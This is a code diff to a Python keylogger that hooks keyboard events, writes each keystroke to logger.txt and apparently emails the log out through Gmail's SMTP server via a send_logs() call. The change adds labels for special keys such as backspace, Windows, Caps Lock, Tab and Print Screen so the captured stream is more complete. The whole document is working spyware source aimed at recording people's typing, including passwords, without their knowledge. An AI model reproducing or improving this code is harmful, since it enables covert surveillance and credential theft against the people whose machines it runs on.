@@ -1,6 +1,7 @@
 import keyboard
 import smtplib
 
+
 keyboard_red = []
 s = smtplib.SMTP('smtp.gmail.com', 587)
 txt_file = open('logger.txt', 'r')
@@ -31,7 +32,24 @@ def logger():
             elif event.name == 'enter':
                 event.name = " \n"
             elif event.name == 'backspace':
+                event.name = "\n <- \n "
+            elif event.name == 'alt':
                 event.name = ""
+            elif event.name == 'windows':
+                event.name = "\n windows \n"
+            elif event.name == 'caps lock':
+                event.name = "\n caps \n"
+            elif event.name == 'tab':
+                event.name = "\n tab \n"
+            elif event.name == 'left windows':
+                event.name = "\n win \n"
+            elif event.name == 'print screen':
+                event.name = "\n ScreenShot \n"
+            elif event.name == 'scroll lock':
+                event.name = '\n locked \n'
+            elif event.name == 'pause':
+                event.name = ' || '
+                
             Writer.write(f"{event.name}")
     send_logs()      
 
